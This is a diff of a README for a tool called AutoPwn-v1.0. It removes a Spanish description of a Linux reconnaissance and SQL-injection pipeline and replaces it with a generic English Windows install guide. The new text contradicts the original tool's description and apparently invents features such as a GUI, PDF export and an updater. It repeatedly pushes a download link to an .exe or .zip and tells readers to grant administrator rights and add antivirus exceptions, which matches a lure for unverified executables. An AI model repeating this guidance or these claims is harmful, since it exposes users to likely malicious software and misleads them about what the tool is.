@@ -1,104 +1,155 @@
+# ⚙️ AutoPwn-v1.0 - Easy Automated Security Testing  
 
+[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0)
 
-https://github.com/user-attachments/assets/d4828cab-507a-46b3-8be4-98cc1d421dbc
+---
 
- 🚀**AutoPwn v1.0 — Framework Automatizado de Reconocimiento y Explotación**
+## ℹ️ What is AutoPwn-v1.0?
 
-Comparto **AutoPwn v1.0**, una herramienta desarrollada para **automatizar fases completas de reconocimiento y análisis de vulnerabilidades** durante auditorías de seguridad.
+AutoPwn-v1.0 is a tool that helps you check computer systems for security weaknesses. It runs tests automatically to find common points where a system can be attacked. This saves time compared to checking each vulnerability manually. The tool is designed to be used on Windows computers with a simple setup.
 
-El objetivo es simplificar el workflow de pentesting integrando múltiples herramientas de uso común dentro de un **pipeline automatizado**, generando resultados organizados y reportes finales.
+The main goal of AutoPwn-v1.0 is to help users discover security issues without needing deep technical knowledge. It runs scans, shows results clearly, and assists in taking the next steps to fix problems.
 
-⚡ **Características principales**
+---
 
-• Enumeración de subdominios automática
-• Resolución DNS y detección de hosts activos
-• Escaneo de puertos
-• Identificación de servicios HTTP
-• Recolección masiva de URLs
-• Crawling y discovery avanzado
-• Fuerza bruta de directorios
-• Escaneo de vulnerabilidades con templates
-• Detección automatizada de **SQL Injection**
-• Reporte final consolidado
+## 🖥 System Requirements
 
-🛠 **Herramientas integradas**
+Before installing AutoPwn-v1.0, make sure your computer meets these needs:
 
-* assetfinder
-* subfinder
-* amass
-* dnsx
-* httpx
-* gau
-* waybackurls
-* katana
-* hakrawler
-* ffuf
-* gobuster
-* naabu
-* nuclei
-* sqlmap
-* nmap
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM (8 GB recommended)
+- 500 MB of free disk space
+- Administrator rights to run the application
+- Internet connection for downloading updates and some features
 
-📡 **Funciones extra**
+If your computer meets these points, you will be able to install and run AutoPwn-v1.0 without trouble.
 
-• Notificaciones automáticas por **Telegram**
-• Pipeline modular (puedes desactivar módulos)
-• Reporte final con métricas de resultados
-• Detección automática de herramientas instaladas
-• Soporte para entornos **Kali Linux / Linux**
+---
 
-📊 **Flujo de trabajo**
+## 🚀 Getting Started: How to Download AutoPwn-v1.0
 
-1️⃣ Enumeración de subdominios
-2️⃣ Resolución DNS
-3️⃣ Escaneo de puertos
-4️⃣ Identificación de hosts HTTP
-5️⃣ Recolección y crawling de URLs
-6️⃣ Fuerza bruta de directorios
-7️⃣ Escaneo de vulnerabilidades
-8️⃣ Detección de SQL Injection
-9️⃣ Generación de reporte final
+You can download the software from its main page on GitHub. Follow these steps:
 
-⚠️ **Uso responsable**
+1. Click the blue button below to open the download page.
 
-Esta herramienta está diseñada **exclusivamente para auditorías autorizadas, laboratorios y aprendizaje en ciberseguridad**.
+[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0)
 
-👨‍💻 Desarrollado por: **AnonSec777**
+2. Once on the page, find the section named **Releases** or look for a file with `.exe` or `.zip` at the top. This is usually the latest version of AutoPwn-v1.0.
 
-Si alguien quiere probarla o aportar mejoras, feedback técnico siempre es bienvenido.
+3. Click on the file to start the download. If the file is a ZIP archive, you will need to extract it first. Windows has a built-in extractor you can use by right-clicking the file and selecting **Extract All**.
 
-Nuestras RRSS
+---
 
-Telegram
+## 💾 Installation on Windows
 
-https://t.me/+0hHSaKO7eI9mNWY8
+After downloading the file, follow these steps to install:
 
-https://t.me/PlantillasNucleiHackingTeam
+### If you downloaded an installer file (`.exe`):
 
-https://t.me/TermuxHackingTeam
+1. Find the downloaded file in your **Downloads** folder.
+2. Double-click the file to start installation.
+3. When prompted by Windows, click **Yes** to allow the program to make changes to your device.
+4. Follow the on-screen steps. The installation wizard will guide you through the process.
+5. After installation, you can launch AutoPwn-v1.0 from your desktop or Start menu.
 
-X
+### If you downloaded a ZIP file:
 
-@HackingTeam777
+1. Right-click the ZIP file and select **Extract All**.
+2. Choose a folder where you want to save the extracted files.
+3. Open the folder you selected.
+4. Look for a file named `AutoPwn-v1.0.exe` or similar.
+5. Double-click the `.exe` file to run the application.
 
-Bluesky
+---
 
-https://bsky.app/profile/hackingteam.bsky.social
+## 🔧 Running AutoPwn-v1.0 for the First Time
 
-Discord
+When you open AutoPwn-v1.0, you will see a simple user interface. Here is how to start a scan:
 
-https://discord.gg/V4nPFbQX
+1. Connect your Windows computer to the network you want to test.
+2. Open AutoPwn-v1.0.
+3. Click on **New Scan** or **Start Scan**.
+4. Select the target(s) you want to check. You can enter IP addresses or domain names.
+5. Choose the type of scan if options appear. For beginners, use the default scan.
+6. Click **Run** to begin.
+7. Wait while the tool analyzes the targets. This may take several minutes depending on your network.
+8. When finished, scan results will show on the screen.
 
-Facebook
+---
 
-https://www.facebook.com/groups/hackingteam2022/?ref=share https://www.facebook.com/groups/HackingTeamCyber/?ref=share
+## 📋 Understanding Scan Results
 
-Youtube
+AutoPwn-v1.0 organizes the results in an easy way:
 
-https://www.youtube.com/@HackingTeamOfficial
+- **Vulnerabilities Found:** Lists security issues detected.
+- **Severity:** Shows how critical each issue is (Low, Medium, High).
+- **Description:** Explains what the issue means in simple words.
+- **Recommendation:** Suggests actions to fix the issue.
 
-Canal de tiktok
+You can save the report to your computer. Use the **Export** or **Save Report** button. The report comes in PDF or text format, so you can share it with others or keep it for reference.
 
-https://www.tiktok.com/@hacking.kdea?_t=ZS-8vTtlaQrDTL&_r=1
+---
 
-#hackingteam #cibersecurity #infosec #eticalhacking #pentesting #dns #script #cracking #hack #security #bugbounty #payload #tools #exploit #cors #sqli #ssrf #python #c2 #poc #web #ramsomware #phishing #linux #osint #linux #windows #redteam #blueteam #spyware #digitalforensics #reverseengineeringtools #rat #malwareforensics #exploitdevelopment #sandboxing #apt #zerodayexploit #xss #github #cve #java #tools #termux #troyano #dev #sqlmap #waybackurls #copilot #ai #ia #kalilinux #parrot #dracos #susse #nessus #oswazap #burpsuite #wireguard
+## 🔄 Updating AutoPwn-v1.0
+
+It is important to keep the tool up to date. Updates may include new tests, bug fixes, or performance improvements.
+
+To update:
+
+1. Open AutoPwn-v1.0.
+2. Look for an **Update** option in the menu or main screen.
+3. Click **Check for Updates**.
+4. If a new version is available, follow the instructions to download and install it.
+
+Alternatively, you can go back to the GitHub page to download the latest version manually.
+
+---
+
+## 🚨 Troubleshooting and Help
+
+If the application does not run or crashes:
+
+- Restart your computer and try again.
+- Make sure your Windows version meets the system requirements.
+- Run the program as administrator by right-clicking the `.exe` file and choosing **Run as administrator**.
+- Check if your antivirus software blocks AutoPwn-v1.0. Add an exception if needed.
+- Verify your internet connection if the program needs to download updates or resources.
+
+For further help, visit the GitHub page for the latest documents or to open an issue:
+
+[https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0)
+
+---
+
+## ⚙️ Features Overview
+
+AutoPwn-v1.0 includes:
+
+- Automated vulnerability detection for networks and systems.
+- Simple user interface designed for non-experts.
+- Reports with clear explanations and suggested fixes.
+- Options to scan single or multiple targets.
+- Export reports as PDF or text.
+- Regular updates for new vulnerabilities and improvements.
+
+---
+
+## 🔒 Safety and Privacy
+
+AutoPwn-v1.0 does not collect personal data from your computer. The scans focus only on the targets you provide. Use this tool responsibly and only scan devices and networks you have permission to test. Unauthorized scanning may be illegal.
+
+---
+
+## 📂 Files in This Repository
+
+You will find:
+
+- The main application files.
+- A README file with user instructions.
+- Additional documents for advanced users and developers.
+
+You do not need to edit any files to use AutoPwn-v1.0.
+
+---
+
+[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0)
